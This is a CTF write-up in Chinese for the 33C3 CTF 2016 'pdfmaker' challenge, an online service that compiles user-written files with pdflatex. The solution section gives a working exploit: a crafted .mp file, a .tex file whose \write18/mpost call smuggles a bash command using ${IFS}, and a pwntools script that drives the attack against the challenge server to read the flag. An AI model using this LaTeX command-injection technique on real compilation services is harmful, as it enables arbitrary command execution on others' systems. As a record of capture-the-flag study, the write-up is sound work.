---
title: '[33C3 CTF 2016] pdfmaker 75'
author: bruce30262
tags:
  - Misc
  - pdflatext
  - 33C3 CTF 2016
categories:
  - write-ups
date: 2016-12-31 08:14:00
---
## Info  
> Category: Misc
> Point: 75
> Author: bruce30262 @ BambooFox
> 
> Description: 
> Just a tiny [application](https://gist.github.com/bruce30262/80b089e24d3a34862fe78892c63d8dcf), that lets the user write some files and compile them with pdflatex. 
> What can possibly go wrong?
> nc 78.46.224.91 24242

## Analyzing
根據題目給的原始碼，我們可以得知這是一個可以讓使用者進行讀寫以及編譯檔案的 service。

* `create`: 製作檔案，檔案類型有: `.log`, `.tex`, `.mb`, `.sty` & `.bib`
* `show`: 顯示指定的檔案內容
* `compile`: 使用 `pdflatext` 編譯一個檔案

解題的過程中 **mike** 找到了一個有用的連結: [Pwning coworkers thanks to LaTeX](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

簡單來說就是透過製作惡意的 `.mp` 和 `.tex` 檔案，我們可以利用 `pdflatext` 在 compile 檔案的時候，透過執行 `mpost` 指令來達到執行任意 command 的效果。

## Solution
基本上只要照著連結裡的方式做即可:
1. create 一個惡意的 `.mp` 檔
2. create 一個惡意的 `.tex` 檔，將裡面的指令改為 `(cat${IFS}$(ls|grep${IFS}33C3))>qqq.log`。這行 command 會將 flag 的內容存到 qqq.log 裡頭
3. 透過 Compile 惡意的 `.tex` 檔來執行我們的 command
4. show qqq.log，得到 flag

final exploit:
```txt sss.mp
verbatimtex
\documentclass{minimal}\begin{document}
etex beginfig (1) label(btex blah etex, origin);
endfig; \end{document} bye
```

```txt aaa.tex
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}$(ls|grep${IFS}33C3))>qqq.log" "sss.mp"}
\end{document}
```

```python exp.py
from pwn import *

r = remote("78.46.224.91", 24242)

log.info("creating sss.mp...")
r.sendlineafter(">", "create mp sss")
r.recvline()
f = open("sss.mp", "r")
for line in f:
    r.sendline(line.strip())
r.sendline("\q")
f.close()

log.info("creating aaa.tex...")
r.sendlineafter(">", "create tex aaa")
r.recvline()
f = open("aaa.tex", "r")
for line in f:
    r.sendline(line.strip())
r.sendline("\q")
f.close()

r.sendlineafter(">", "compile aaa")
r.sendlineafter(">", "show log qqq")

r.interactive()
```

**Don't take LaTEX files from strangers!!**

flag: `33C3_pdflatex_1s_t0t4lly_s3cur3!`
